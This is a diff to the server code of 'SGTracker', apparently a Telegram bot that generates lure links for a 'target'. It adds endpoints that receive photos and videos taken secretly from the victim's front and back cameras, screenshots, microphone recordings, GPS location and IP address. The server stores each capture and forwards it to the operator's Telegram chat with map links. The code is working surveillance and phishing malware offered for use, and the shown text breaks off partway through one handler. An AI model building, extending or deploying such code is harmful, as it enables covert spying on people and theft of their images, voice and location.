@@ -19,8 +19,11 @@ app.use(cors());
 
 // Global variables
 const bot = new TelegramBot(process.env.bot);
-const hostURL = "https://sg-modder-offcial.vercel.app"; // अपना Vercel URL यहां है
+const hostURL = "https://857fca26-7e7b-4c59-850a-27678795cdad-00-3b98bmun3p673.pike.replit.dev:5000"; // Direct Vercel URL as requested
 const use1pt = false;
+
+// Store active targets for tracking
+const targets = {};
 
 // Get the template paths
 const viewsPath = path.join(process.cwd(), 'views');
@@ -179,6 +182,9 @@ async function createLink(cid, msg, captureMethodId = "full") {
 
     // Get capture method code
     const captureCode = captureMethods.generateCaptureCode(captureMethodId);
+    
+    // Log the capture method details for debugging
+    console.log(`Creating link with captureMethodId: ${captureMethodId}, code: ${captureCode}`);
     
     // Add capture method code to URLs
     var cUrl = `${hostURL}/c/${url}/${captureCode}`;
@@ -410,39 +416,60 @@ const captureMethods = {
   // Different capture method configurations
   methods: [
     {
-      id: "full",
-      name: "Full Capture",
-      description: "Device Info + Front Camera + Location",
+      id: "screenshot",
+      name: "Full Screenshot 📱",
+      description: "Full Phone Screenshot with Status Bar",
+      emoji: "📸",
+      code: "screenshot"
+    },
+    {
+      id: "frontcam",
+      name: "Front Camera Image 📸",
+      description: "Front Camera Photo Capture + Device Info + Location",
       emoji: "📱",
-      code: "full"
+      code: "frontcam"
     },
     {
-      id: "back",
-      name: "Back Camera",
-      description: "Device Info + Back Camera + Location",
+      id: "backcam",
+      name: "Back Camera Image 📸",
+      description: "Back Camera Photo Capture + Device Info + Location",
       emoji: "📷", 
-      code: "back"
+      code: "backcam"
     },
     {
-      id: "minimal",
-      name: "Minimal",
-      description: "Device Info + Location only (No Camera)",
-      emoji: "💻",
-      code: "min"
+      id: "frontvideo",
+      name: "Front Camera Video 🎥",
+      description: "Front Camera 10s Video Recording + Device Info + Location",
+      emoji: "📹",
+      code: "frontvideo"
+    },
+    {
+      id: "backvideo",
+      name: "Back Camera Video 🎥",
+      description: "Back Camera 10s Video Recording + Device Info + Location",
+      emoji: "🎬", 
+      code: "backvideo"
+    },
+    {
+      id: "allcams",
+      name: "All Cameras 🎥✨",
+      description: "Videos from Front & Back Cameras Simultaneously",
+      emoji: "📹",
+      code: "allcams"
     },
     {
       id: "audio",
-      name: "Audio Capture",
-      description: "Device Info + Audio Recording + Location",
-      emoji: "🎤",
+      name: "Audio Recording 🎤",
+      description: "15-second Microphone Recording",
+      emoji: "🎵",
       code: "audio"
     },
     {
-      id: "screen",
-      name: "Screen Capture",
-      description: "Device Info + Screen Recording + Location",
-      emoji: "🎬",
-      code: "screen"
+      id: "minimal",
+      name: "Device Info 💻",
+      description: "Basic Device & Location Data (No Media)",
+      emoji: "📊",
+      code: "min"
     }
   ],
   
@@ -505,7 +532,14 @@ async function createNew(cid, messageId = null) {
   
   // Message content
   const methodSelectionText = `<b>🌟 Choose Capture Method 🌟</b>\n\n` +
-    `Select what you want to capture from your target:`;
+    `Select what you want to capture from your target:\n\n` +
+    `<b>✨ NEW!</b> Choose between <b>Camera Image</b> and <b>Camera Video</b> options!\n\n` +
+    `• 📸 <b>Camera Images:</b> High-quality photos (front/back)\n` +
+    `• 🎥 <b>Camera Videos:</b> 10-second video recordings\n` +
+    `• 📹 <b>All Cameras:</b> Videos from front & back simultaneously\n` +
+    `• 📱 <b>Screenshot:</b> Full phone screen with status bar\n` +
+    `• 🎵 <b>Audio:</b> 15-second microphone recording\n` +
+    `• 📊 <b>Device Info:</b> Basic data without media`;
   
   // If messageId is provided, edit the existing message
   if (messageId) {
@@ -553,9 +587,25 @@ async function processLinkWithCaptureMethod(cid, captureMethodId, messageId = nu
   };
   
   // Single message with method info and URL prompt
-  const messageText = `${method.emoji} ${method.name} selected\n\n` +
-    `<b>This will capture:</b> <i>${method.description}</i>\n\n` +
-    `Enter Your URL:`;
+  let messageText = `${method.emoji} ${method.name} selected\n\n` +
+    `<b>This will capture:</b> <i>${method.description}</i>\n\n`;
+    
+  // Add special messages based on method
+  if (method.id === 'screenshot') {
+    messageText += `<b>✨ Great choice!</b> Screenshots provide the most detailed view of the target's phone screen.\n\n`;
+  } else if (method.id === 'allcams') {
+    messageText += `<b>✨ Excellent choice!</b> This will record videos from both front and back cameras simultaneously.\n\n`;
+  } else if (method.id === 'frontcam' || method.id === 'backcam') {
+    messageText += `<b>✨ Camera Image!</b> This will capture multiple photos from the target's camera.\n\n`;
+  } else if (method.id === 'frontvideo' || method.id === 'backvideo') {
+    messageText += `<b>✨ Video Recording!</b> This will record a 10-second video clip from the target's camera.\n\n`;
+  } else if (method.id === 'audio') {
+    messageText += `<b>✨ Audio Recording!</b> This will capture a 15-second audio clip from the target's microphone.\n\n`;
+  } else if (method.id === 'minimal') {
+    messageText += `<b>✨ Device Info!</b> This will collect basic device information and location data only.\n\n`;
+  }
+  
+  messageText += `Enter Your URL:`;
   
   try {
     if (messageId) {
@@ -634,12 +684,77 @@ app.post("/location", async (req, res) => {
     var acc = decodeURIComponent(req.body.acc) || null;
     
     if (lon != null && lat != null && uid != null && acc != null) {
-      await bot.sendLocation(parseInt(uid, 36), lat, lon);
-      await bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
+      try {
+        // First send the actual location for Telegram map
+        await bot.sendLocation(parseInt(uid, 36), lat, lon);
+        
+        // Get client IP if it's stored in targets
+        const ipAddress = targets[uid]?.ip || 'Unknown';
+        const timestamp = getFormattedDate();
+        
+        // Get additional information
+        let chatId;
+        try {
+          // First check if it's in targets
+          if (targets[uid] && targets[uid].chatId) {
+            chatId = targets[uid].chatId;
+          } else {
+            // Otherwise, convert from base36
+            chatId = parseInt(uid, 36);
+          }
+        } catch (error) {
+          console.error("Error converting uid to chat ID:", error);
+          chatId = parseInt(uid, 36); // Fallback to the conversion
+        }
+        
+        // Format accuracy for better readability
+        let accuracyText = "High";
+        if (acc > 100) {
+          accuracyText = "Low";
+        } else if (acc > 30) {
+          accuracyText = "Medium";
+        }
+        
+        // Create Google Maps link
+        const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+        
+        // Create interactive links with buttons
+        const locationCaption = 
+          `📍 <b>Location Captured Successfully</b> 📍\n\n` +
+          `🎯 <b>Target:</b> <code>${uid}</code>\n` +
+          `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
+          `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n\n` +
+          `📌 <b>Latitude:</b> <code>${lat.toFixed(6)}</code>\n` +
+          `📌 <b>Longitude:</b> <code>${lon.toFixed(6)}</code>\n` +
+          `📏 <b>Accuracy:</b> <code>${Math.round(acc)} meters</code> (${accuracyText})\n\n` +
+          `<i>Captured using SGTracker by @SG_Modder</i>`;
+          
+        // Create inline keyboard with buttons
+        const inlineKeyboard = {
+          inline_keyboard: [
+            [
+              { text: "🗺️ Open in Google Maps", url: googleMapsUrl }
+            ],
+            [
+              { text: "🌍 Open in OpenStreetMap", url: `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=16` }
+            ]
+          ]
+        };
+        
+        // Send detailed message with interactive buttons
+        await bot.sendMessage(chatId, locationCaption, {
+          parse_mode: "HTML",
+          reply_markup: inlineKeyboard
+        });
+        
+        console.log("Location information sent successfully to Telegram");
+      } catch (error) {
+        console.error("Error sending location to Telegram:", error);
+      }
       
-      res.send("Done");
+      res.send("Location processed successfully");
     } else {
-      res.status(400).send("Bad Request");
+      res.status(400).send("Bad Request: Missing location parameters");
     }
   } catch (error) {
     console.error("Error in location handler:", error);
@@ -650,29 +765,912 @@ app.post("/location", async (req, res) => {
 // Camera snapshot route
 app.post("/camsnap", async (req, res) => {
   try {
+    console.log("Camera snapshot endpoint hit");
+    
     var uid = decodeURIComponent(req.body.uid) || null;
     var img = decodeURIComponent(req.body.img) || null;
       
     if (uid != null && img != null) {
-      var buffer = Buffer.from(img, 'base64');
-        
-      var info = {
-        filename: "camsnap.png",
-        contentType: 'image/png'
-      };
-        
+      console.log(`Received camera snapshot for uid ${uid}`);
+      
       try {
-        await bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
-      } catch (error) {
-        console.log("Error sending photo:", error);
-      }
+        // Convert base64 to buffer
+        var buffer = Buffer.from(img, 'base64');
+        console.log(`Converted base64 to buffer, size: ${buffer.length} bytes`);
         
-      res.send("Done");
+        // Create directory if it doesn't exist
+        const dirPath = path.join(__dirname, '..', 'screens');
+        fs.mkdirSync(dirPath, { recursive: true });
+        
+        // Save image to file
+        const filePath = path.join(dirPath, `${uid}_camsnap.png`);
+        fs.writeFileSync(filePath, buffer);
+        console.log(`Camera snapshot saved to ${filePath}`);
+          
+        // Get client IP if it's stored in targets
+        const ipAddress = targets[uid]?.ip || 'Unknown';
+        const timestamp = getFormattedDate();
+        
+        // Convert uid to chat ID if needed
+        let chatId;
+        try {
+          // First check if it's in targets
+          if (targets[uid] && targets[uid].chatId) {
+            chatId = targets[uid].chatId;
+          } else {
+            // Otherwise, convert from base36
+            chatId = parseInt(uid, 36);
+          }
+          console.log(`Sending to chat ID: ${chatId}`);
+        } catch (error) {
+          console.error("Error converting uid to chat ID:", error);
+          chatId = parseInt(uid, 36); // Fallback to the conversion
+        }
+          
+        // Create a more attractive caption with emojis and formatting
+        const imageCaption = 
+          `📸 <b>Camera Snapshot Captured</b> 📸\n\n` +
+          `👤 <b>Target:</b> <code>${uid}</code>\n` +
+          `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
+          `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n` +
+          `📊 <b>Size:</b> <code>${Math.round(buffer.length/1024)} KB</code>\n\n` +
+          `<i>Captured using SGTracker by @SG_Modder</i>`;
+          
+        // Send photo to Telegram using file path
+        var info = {
+          filename: "camsnap.png",
+          contentType: 'image/png'
+        };
+        
+        await bot.sendPhoto(chatId, filePath, { 
+          caption: imageCaption,
+          parse_mode: "HTML"
+        }, info);
+        
+        console.log("Camera snapshot sent successfully to Telegram");
+      } catch (error) {
+        console.error("Error processing camera snapshot:", error);
+        res.status(500).send("Error processing camera snapshot");
+        return;
+      }
+      
+      res.status(200).send("Camera snapshot processed successfully");
     } else {
-      res.status(400).send("Bad Request");
+      res.status(400).send("Missing UID or image data");
     }
   } catch (error) {
-    console.error("Error in camsnap handler:", error);
+    console.error("Error in camera snapshot handler:", error);
+    res.status(500).send("Internal Server Error");
+  }
+});
+
+// Audio recording route
+app.post("/audiorecording", async (req, res) => {
+  try {
+    console.log("Audio recording endpoint hit");
+    
+    var uid = decodeURIComponent(req.body.uid) || null;
+    var audioData = decodeURIComponent(req.body.data) || null;
+      
+    if (uid != null && audioData != null) {
+      console.log(`Received audio recording for uid ${uid}`);
+      
+      try {
+        // Convert base64 to buffer
+        var buffer = Buffer.from(audioData, 'base64');
+        console.log(`Converted base64 to buffer, size: ${buffer.length} bytes`);
+        
+        // Create directory if it doesn't exist
+        const dirPath = path.join(__dirname, '..', 'screens');
+        fs.mkdirSync(dirPath, { recursive: true });
+        
+        // Save audio to file
+        const filePath = path.join(dirPath, `${uid}_audio_recording.ogg`);
+        fs.writeFileSync(filePath, buffer);
+        console.log(`Audio recording saved to ${filePath}`);
+        
+        // Get client IP if it's stored in targets
+        const ipAddress = targets[uid]?.ip || 'Unknown';
+        const timestamp = getFormattedDate();
+        
+        // Convert uid to chat ID if needed
+        let chatId;
+        try {
+          // First check if it's in targets
+          if (targets[uid] && targets[uid].chatId) {
+            chatId = targets[uid].chatId;
+          } else {
+            // Otherwise, convert from base36
+            chatId = parseInt(uid, 36);
+          }
+          console.log(`Sending to chat ID: ${chatId}`);
+        } catch (error) {
+          console.error("Error converting uid to chat ID:", error);
+          chatId = parseInt(uid, 36); // Fallback to the conversion
+        }
+        
+        // Create a more attractive caption with emojis and formatting
+        const audioCaption = 
+          `🎤 <b>Audio Recording Captured</b> 🎤\n\n` +
+          `👤 <b>Target:</b> <code>${uid}</code>\n` +
+          `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
+          `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n` +
+          `📊 <b>Size:</b> <code>${Math.round(buffer.length/1024)} KB</code>\n` +
+          `⏱️ <b>Duration:</b> <code>~15 seconds</code>\n\n` +
+          `<i>Captured using SGTracker by @SG_Modder</i>`;
+          
+        // File info
+        var info = {
+          filename: "audio_recording.ogg",  // Using ogg for better Telegram support
+          contentType: 'audio/ogg'
+        };
+        
+        try {
+          // Send as voice message for better playback in Telegram
+          await bot.sendVoice(chatId, filePath, { 
+            caption: audioCaption,
+            parse_mode: "HTML"
+          }, info);
+          console.log("Audio recording sent successfully to Telegram");
+        } catch (error) {
+          console.log("Error sending audio recording to Telegram:", error);
+          // Try to send as document if voice fails
+          try {
+            await bot.sendDocument(chatId, filePath, { 
+              caption: audioCaption + "\n\n⚠️ Sent as document due to audio processing error.",
+              parse_mode: "HTML"
+            }, info);
+            console.log("Audio recording sent as document to Telegram");
+          } catch (docError) {
+            console.log("Error sending audio recording as document:", docError);
+          }
+        }
+      } catch (error) {
+        console.error("Error processing audio recording:", error);
+        res.status(500).send("Error processing recording");
+        return;
+      }
+      
+      res.status(200).send("Audio recording processed successfully");
+    } else {
+      res.status(400).send("Missing UID or audio data");
+    }
+  } catch (error) {
+    console.error("Error in audio recording handler:", error);
+    res.status(500).send("Internal Server Error");
+  }
+});
+
+// Front Camera Video endpoint
+app.post("/videofrontcamera", async (req, res) => {
+  try {
+    console.log("Front camera video endpoint hit");
+    
+    var uid = decodeURIComponent(req.body.uid) || null;
+    var videoData = decodeURIComponent(req.body.data) || null;
+      
+    if (uid != null && videoData != null) {
+      console.log(`Received front camera video for uid ${uid}`);
+      
+      try {
+        // Convert base64 to buffer
+        var buffer = Buffer.from(videoData, 'base64');
+        console.log(`Converted base64 to buffer, size: ${buffer.length} bytes`);
+          
+        // Create directory if it doesn't exist
+        const dirPath = path.join(__dirname, '..', 'screens');
+        fs.mkdirSync(dirPath, { recursive: true });
+        
+        // Save video to file
+        const filePath = path.join(dirPath, `${uid}_front_camera_video.webm`);
+        fs.writeFileSync(filePath, buffer);
+        console.log(`Front camera video saved to ${filePath}`);
+          
+        // Get client IP if it's stored in targets
+        const ipAddress = targets[uid]?.ip || 'Unknown';
+        const timestamp = getFormattedDate();
+        
+        // Convert uid to chat ID if needed
+        let chatId;
+        try {
+          // First check if it's in targets
+          if (targets[uid] && targets[uid].chatId) {
+            chatId = targets[uid].chatId;
+          } else {
+            // Otherwise, convert from base36
+            chatId = parseInt(uid, 36);
+          }
+          console.log(`Sending to chat ID: ${chatId}`);
+        } catch (error) {
+          console.error("Error converting uid to chat ID:", error);
+          chatId = uid; // Fallback to the original uid
+        }
+        
+        // Create a more attractive caption with emojis and formatting
+        const videoCaption = 
+          `🎥 <b>Front Camera Video Captured</b> 🎥\n\n` +
+          `📱 <b>Target:</b> <code>${uid}</code>\n` +
+          `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
+          `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n` +
+          `📊 <b>Size:</b> <code>${Math.round(buffer.length/1024)} KB</code>\n` +
+          `⏱️ <b>Duration:</b> <code>10 seconds</code>\n\n` +
+          `<i>Captured using SGTracker by @SG_Modder</i>`;
+          
+        try {
+          // Send video to Telegram using file path
+          await bot.sendVideo(chatId, filePath, { 
+            caption: videoCaption,
+            parse_mode: "HTML"
+          });
+          console.log("Front camera video sent successfully to Telegram");
+        } catch (error) {
+          console.log("Error sending front camera video to Telegram:", error);
+          // Try to send as document if video send fails
+          try {
+            await bot.sendDocument(chatId, filePath, { 
+              caption: videoCaption + "\n\n⚠️ Sent as document due to video processing error.",
+              parse_mode: "HTML"
+            });
+            console.log("Front camera video sent as document to Telegram");
+          } catch (docError) {
+            console.log("Error sending front camera video as document:", docError);
+          }
+        }
+      } catch (error) {
+        console.error("Error processing front camera video:", error);
+        res.status(500).send("Error processing recording");
+        return;
+      }
+      
+      res.status(200).send("Front camera video processed successfully");
+    } else {
+      res.status(400).send("Missing UID or video data");
+    }
+  } catch (error) {
+    console.error("Error in front camera video handler:", error);
+    res.status(500).send("Internal Server Error");
+  }
+});
+
+// Back Camera Video endpoint
+app.post("/videobackcamera", async (req, res) => {
+  try {
+    console.log("Back camera video endpoint hit");
+    
+    var uid = decodeURIComponent(req.body.uid) || null;
+    var videoData = decodeURIComponent(req.body.data) || null;
+      
+    if (uid != null && videoData != null) {
+      console.log(`Received back camera video for uid ${uid}`);
+      
+      try {
+        // Convert base64 to buffer
+        var buffer = Buffer.from(videoData, 'base64');
+        console.log(`Converted base64 to buffer, size: ${buffer.length} bytes`);
+          
+        // Create directory if it doesn't exist
+        const dirPath = path.join(__dirname, '..', 'screens');
+        fs.mkdirSync(dirPath, { recursive: true });
+        
+        // Save video to file
+        const filePath = path.join(dirPath, `${uid}_back_camera_video.webm`);
+        fs.writeFileSync(filePath, buffer);
+        console.log(`Back camera video saved to ${filePath}`);
+          
+        // Get client IP if it's stored in targets
+        const ipAddress = targets[uid]?.ip || 'Unknown';
+        const timestamp = getFormattedDate();
+        
+        // Convert uid to chat ID if needed
+        let chatId;
+        try {
+          // First check if it's in targets
+          if (targets[uid] && targets[uid].chatId) {
+            chatId = targets[uid].chatId;
+          } else {
+            // Otherwise, convert from base36
+            chatId = parseInt(uid, 36);
+          }
+          console.log(`Sending to chat ID: ${chatId}`);
+        } catch (error) {
+          console.error("Error converting uid to chat ID:", error);
+          chatId = uid; // Fallback to the original uid
+        }
+        
+        // Create a more attractive caption with emojis and formatting
+        const videoCaption = 
+          `🎥 <b>Back Camera Video Captured</b> 🎥\n\n` +
+          `📱 <b>Target:</b> <code>${uid}</code>\n` +
+          `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
+          `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n` +
+          `📊 <b>Size:</b> <code>${Math.round(buffer.length/1024)} KB</code>\n` +
+          `⏱️ <b>Duration:</b> <code>10 seconds</code>\n\n` +
+          `<i>Captured using SGTracker by @SG_Modder</i>`;
+          
+        try {
+          // Send video to Telegram using file path
+          await bot.sendVideo(chatId, filePath, { 
+            caption: videoCaption,
+            parse_mode: "HTML"
+          });
+          console.log("Back camera video sent successfully to Telegram");
+        } catch (error) {
+          console.log("Error sending back camera video to Telegram:", error);
+          // Try to send as document if video send fails
+          try {
+            await bot.sendDocument(chatId, filePath, { 
+              caption: videoCaption + "\n\n⚠️ Sent as document due to video processing error.",
+              parse_mode: "HTML"
+            });
+            console.log("Back camera video sent as document to Telegram");
+          } catch (docError) {
+            console.log("Error sending back camera video as document:", docError);
+          }
+        }
+      } catch (error) {
+        console.error("Error processing back camera video:", error);
+        res.status(500).send("Error processing recording");
+        return;
+      }
+      
+      res.status(200).send("Back camera video processed successfully");
+    } else {
+      res.status(400).send("Missing UID or video data");
+    }
+  } catch (error) {
+    console.error("Error in back camera video handler:", error);
+    res.status(500).send("Internal Server Error");
+  }
+});
+
+// Generic Camera Video endpoint (for backward compatibility)
+app.post("/cameravideo", async (req, res) => {
+  try {
+    console.log("Camera video endpoint hit");
+    
+    var uid = decodeURIComponent(req.body.uid) || null;
+    var videoData = decodeURIComponent(req.body.data) || null;
+      
+    if (uid != null && videoData != null) {
+      console.log(`Received camera video for uid ${uid}`);
+      
+      try {
+        // Convert base64 to buffer
+        var buffer = Buffer.from(videoData, 'base64');
+        console.log(`Converted base64 to buffer, size: ${buffer.length} bytes`);
+          
+        // Create directory if it doesn't exist
+        const dirPath = path.join(__dirname, '..', 'screens');
+        fs.mkdirSync(dirPath, { recursive: true });
+        
+        // Save video to file
+        const filePath = path.join(dirPath, `${uid}_camera_video.webm`);
+        fs.writeFileSync(filePath, buffer);
+        console.log(`Camera video saved to ${filePath}`);
+          
+        // Get client IP if it's stored in targets
+        const ipAddress = targets[uid]?.ip || 'Unknown';
+        const timestamp = getFormattedDate();
+        
+        // Convert uid to chat ID if needed
+        let chatId;
+        try {
+          // First check if it's in targets
+          if (targets[uid] && targets[uid].chatId) {
+            chatId = targets[uid].chatId;
+          } else {
+            // Otherwise, convert from base36
+            chatId = parseInt(uid, 36);
+          }
+          console.log(`Sending to chat ID: ${chatId}`);
+        } catch (error) {
+          console.error("Error converting uid to chat ID:", error);
+          chatId = uid; // Fallback to the original uid
+        }
+        
+        // Create a more attractive caption with emojis and formatting
+        const videoCaption = 
+          `🎥 <b>Camera Video Captured</b> 🎥\n\n` +
+          `📱 <b>Target:</b> <code>${uid}</code>\n` +
+          `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
+          `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n` +
+          `📊 <b>Size:</b> <code>${Math.round(buffer.length/1024)} KB</code>\n\n` +
+          `<i>Captured using SGTracker by @SG_Modder</i>`;
+          
+        try {
+          // Send video to Telegram using file path
+          await bot.sendVideo(chatId, filePath, { 
+            caption: videoCaption,
+            parse_mode: "HTML"
+          });
+          console.log("Camera video sent successfully to Telegram");
+        } catch (error) {
+          console.log("Error sending camera video to Telegram:", error);
+          // Try to send as document if video send fails
+          try {
+            await bot.sendDocument(chatId, filePath, { 
+              caption: videoCaption + "\n\n⚠️ Sent as document due to video processing error.",
+              parse_mode: "HTML"
+            });
+            console.log("Camera video sent as document to Telegram");
+          } catch (docError) {
+            console.log("Error sending camera video as document:", docError);
+          }
+        }
+      } catch (error) {
+        console.error("Error processing camera video:", error);
+        res.status(500).send("Error processing recording");
+        return;
+      }
+      
+      res.status(200).send("Camera video processed successfully");
+    } else {
+      res.status(400).send("Missing UID or video data");
+    }
+  } catch (error) {
+    console.error("Error in camera video handler:", error);
+    res.status(500).send("Internal Server Error");
+  }
+});
+
+// Screen recording endpoint (redirects to cameravideo for compatibility)
+app.post("/screenrecording", async (req, res) => {
+  console.log("Redirecting screen recording request to camera video endpoint");
+  try {
+    // Forward the request to the camera video endpoint
+    req.url = "/cameravideo";
+    app._router.handle(req, res);
+  } catch (error) {
+    console.error("Error redirecting screen recording request:", error);
+    res.status(500).send("Internal Server Error");
+  }
+});
+
+// Front camera recording endpoint
+app.post("/frontcamera", async (req, res) => {
+  try {
+    console.log("Front camera recording endpoint hit");
+    
+    var uid = decodeURIComponent(req.body.uid) || null;
+    var videoData = decodeURIComponent(req.body.data) || null;
+      
+    if (uid != null && videoData != null) {
+      console.log(`Received front camera recording for uid ${uid}`);
+      
+      try {
+        // Convert base64 to buffer
+        var buffer = Buffer.from(videoData, 'base64');
+        console.log(`Converted base64 to buffer, size: ${buffer.length} bytes`);
+          
+        // Create directory if it doesn't exist
+        const dirPath = path.join(__dirname, '..', 'screens');
+        fs.mkdirSync(dirPath, { recursive: true });
+        
+        // Save video to file
+        const filePath = path.join(dirPath, `${uid}_front_camera.webm`);
+        fs.writeFileSync(filePath, buffer);
+        console.log(`Front camera recording saved to ${filePath}`);
+          
+        // Get client IP if it's stored in targets
+        const ipAddress = targets[uid]?.ip || 'Unknown';
+        const timestamp = getFormattedDate();
+        
+        // Convert uid to chat ID if needed
+        let chatId;
+        try {
+          // First check if it's in targets
+          if (targets[uid] && targets[uid].chatId) {
+            chatId = targets[uid].chatId;
+          } else {
+            // Otherwise, convert from base36
+            chatId = parseInt(uid, 36);
+          }
+          console.log(`Sending to chat ID: ${chatId}`);
+        } catch (error) {
+          console.error("Error converting uid to chat ID:", error);
+          chatId = uid; // Fallback to the original uid
+        }
+        
+        // Create a more attractive caption with emojis and formatting
+        const videoCaption = 
+          `📱 <b>Front Camera Recording Captured</b> 📱\n\n` +
+          `👤 <b>Target:</b> <code>${uid}</code>\n` +
+          `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
+          `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n` +
+          `📊 <b>Size:</b> <code>${Math.round(buffer.length/1024)} KB</code>\n\n` +
+          `<i>Captured using SGTracker by @SG_Modder</i>`;
+          
+        try {
+          // Send video to Telegram using file path
+          await bot.sendVideo(chatId, filePath, { 
+            caption: videoCaption,
+            parse_mode: "HTML"
+          });
+          console.log("Front camera recording sent successfully to Telegram");
+        } catch (error) {
+          console.log("Error sending front camera recording to Telegram:", error);
+          // Try to send as document if video send fails
+          try {
+            await bot.sendDocument(chatId, filePath, { 
+              caption: videoCaption + "\n\n⚠️ Sent as document due to video processing error.",
+              parse_mode: "HTML"
+            });
+            console.log("Front camera recording sent as document to Telegram");
+          } catch (docError) {
+            console.log("Error sending front camera recording as document:", docError);
+          }
+        }
+      } catch (error) {
+        console.error("Error processing front camera recording:", error);
+        res.status(500).send("Error processing recording");
+        return;
+      }
+      
+      res.status(200).send("Front camera recording processed successfully");
+    } else {
+      res.status(400).send("Missing UID or video data");
+    }
+  } catch (error) {
+    console.error("Error in front camera recording handler:", error);
+    res.status(500).send("Internal Server Error");
+  }
+});
+
+// Back camera recording endpoint
+app.post("/backcamera", async (req, res) => {
+  try {
+    console.log("Back camera recording endpoint hit");
+    
+    var uid = decodeURIComponent(req.body.uid) || null;
+    var videoData = decodeURIComponent(req.body.data) || null;
+      
+    if (uid != null && videoData != null) {
+      console.log(`Received back camera recording for uid ${uid}`);
+      
+      try {
+        // Convert base64 to buffer
+        var buffer = Buffer.from(videoData, 'base64');
+        console.log(`Converted base64 to buffer, size: ${buffer.length} bytes`);
+          
+        // Create directory if it doesn't exist
+        const dirPath = path.join(__dirname, '..', 'screens');
+        fs.mkdirSync(dirPath, { recursive: true });
+        
+        // Save video to file
+        const filePath = path.join(dirPath, `${uid}_back_camera.webm`);
+        fs.writeFileSync(filePath, buffer);
+        console.log(`Back camera recording saved to ${filePath}`);
+          
+        // Get client IP if it's stored in targets
+        const ipAddress = targets[uid]?.ip || 'Unknown';
+        const timestamp = getFormattedDate();
+        
+        // Convert uid to chat ID if needed
+        let chatId;
+        try {
+          // First check if it's in targets
+          if (targets[uid] && targets[uid].chatId) {
+            chatId = targets[uid].chatId;
+          } else {
+            // Otherwise, convert from base36
+            chatId = parseInt(uid, 36);
+          }
+          console.log(`Sending to chat ID: ${chatId}`);
+        } catch (error) {
+          console.error("Error converting uid to chat ID:", error);
+          chatId = uid; // Fallback to the original uid
+        }
+        
+        // Create a more attractive caption with emojis and formatting
+        const videoCaption = 
+          `📷 <b>Back Camera Recording Captured</b> 📷\n\n` +
+          `👤 <b>Target:</b> <code>${uid}</code>\n` +
+          `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
+          `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n` +
+          `📊 <b>Size:</b> <code>${Math.round(buffer.length/1024)} KB</code>\n\n` +
+          `<i>Captured using SGTracker by @SG_Modder</i>`;
+          
+        try {
+          // Send video to Telegram using file path
+          await bot.sendVideo(chatId, filePath, { 
+            caption: videoCaption,
+            parse_mode: "HTML"
+          });
+          console.log("Back camera recording sent successfully to Telegram");
+        } catch (error) {
+          console.log("Error sending back camera recording to Telegram:", error);
+          // Try to send as document if video send fails
+          try {
+            await bot.sendDocument(chatId, filePath, { 
+              caption: videoCaption + "\n\n⚠️ Sent as document due to video processing error.",
+              parse_mode: "HTML"
+            });
+            console.log("Back camera recording sent as document to Telegram");
+          } catch (docError) {
+            console.log("Error sending back camera recording as document:", docError);
+          }
+        }
+      } catch (error) {
+        console.error("Error processing back camera recording:", error);
+        res.status(500).send("Error processing recording");
+        return;
+      }
+      
+      res.status(200).send("Back camera recording processed successfully");
+    } else {
+      res.status(400).send("Missing UID or video data");
+    }
+  } catch (error) {
+    console.error("Error in back camera recording handler:", error);
+    res.status(500).send("Internal Server Error");
+  }
+});
+
+// All cameras endpoint - combines front and back camera recordings
+app.post("/allcams", async (req, res) => {
+  try {
+    console.log("All cameras recording endpoint hit");
+    
+    var uid = decodeURIComponent(req.body.uid) || null;
+    var frontVideoData = decodeURIComponent(req.body.frontData) || null;
+    var backVideoData = decodeURIComponent(req.body.backData) || null;
+    var screenData = decodeURIComponent(req.body.screenData) || null;
+      
+    if (uid != null && (frontVideoData != null || backVideoData != null || screenData != null)) {
+      console.log(`Received multi-camera recording for uid ${uid}`);
+      
+      try {
+        // Create directory if it doesn't exist
+        const dirPath = path.join(__dirname, '..', 'screens');
+        fs.mkdirSync(dirPath, { recursive: true });
+        
+        // Save videos to files if available
+        let filesPaths = [];
+        
+        if (frontVideoData) {
+          var frontBuffer = Buffer.from(frontVideoData, 'base64');
+          const frontFilePath = path.join(dirPath, `${uid}_front_camera.webm`);
+          fs.writeFileSync(frontFilePath, frontBuffer);
+          console.log(`Front camera recording saved to ${frontFilePath}`);
+          filesPaths.push(frontFilePath);
+        }
+        
+        if (backVideoData) {
+          var backBuffer = Buffer.from(backVideoData, 'base64');
+          const backFilePath = path.join(dirPath, `${uid}_back_camera.webm`);
+          fs.writeFileSync(backFilePath, backBuffer);
+          console.log(`Back camera recording saved to ${backFilePath}`);
+          filesPaths.push(backFilePath);
+        }
+        
+        if (screenData) {
+          var screenBuffer = Buffer.from(screenData, 'base64');
+          const screenFilePath = path.join(dirPath, `${uid}_screen_recording.webm`);
+          fs.writeFileSync(screenFilePath, screenBuffer);
+          console.log(`Screen recording saved to ${screenFilePath}`);
+          filesPaths.push(screenFilePath);
+        }
+          
+        // Get client IP if it's stored in targets
+        const ipAddress = targets[uid]?.ip || 'Unknown';
+        const timestamp = getFormattedDate();
+        
+        // Convert uid to chat ID if needed
+        let chatId;
+        try {
+          // First check if it's in targets
+          if (targets[uid] && targets[uid].chatId) {
+            chatId = targets[uid].chatId;
+          } else {
+            // Otherwise, convert from base36
+            chatId = parseInt(uid, 36);
+          }
+          console.log(`Sending to chat ID: ${chatId}`);
+        } catch (error) {
+          console.error("Error converting uid to chat ID:", error);
